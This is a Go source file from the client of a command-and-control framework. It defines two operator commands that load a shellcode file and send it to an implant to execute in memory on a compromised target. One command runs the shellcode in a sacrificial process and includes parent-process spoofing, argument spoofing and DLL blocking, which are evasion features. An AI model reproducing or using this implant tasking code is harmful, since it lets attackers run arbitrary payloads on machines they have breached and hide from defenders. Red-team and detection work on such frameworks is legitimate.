package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"google.golang.org/protobuf/proto"
	"os"
	"path/filepath"
)

// ExecuteShellcodeCmd - Execute shellcode in-memory
func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	ppid := ctx.Flags.Uint("ppid")
	shellcodePath := ctx.Args.String("path")
	processname := ctx.Flags.String("process")
	paramString := ctx.Flags.StringSlice("args")
	argue := ctx.Flags.String("argue")
	isBlockDll := ctx.Flags.Bool("block_dll")
	shellcodeBin, err := os.ReadFile(shellcodePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}

	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(shellcodePath),
		Bin:    shellcodeBin,
		Type:   consts.ModuleExecuteShellcode,
		Output: true,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   append([]string{processname}, paramString...),
		},
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}

func InlineShellcodeCmd(ctx *grumble.Context, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	path := ctx.Args.String("path")
	data, err := os.ReadFile(path)
	if err != nil {
		console.Log.Errorf("Error reading file: %v", err)
		return
	}
	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:   filepath.Base(path),
		Bin:    data,
		Type:   consts.ModuleExecuteShellcode,
		Output: true,
	})
	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}
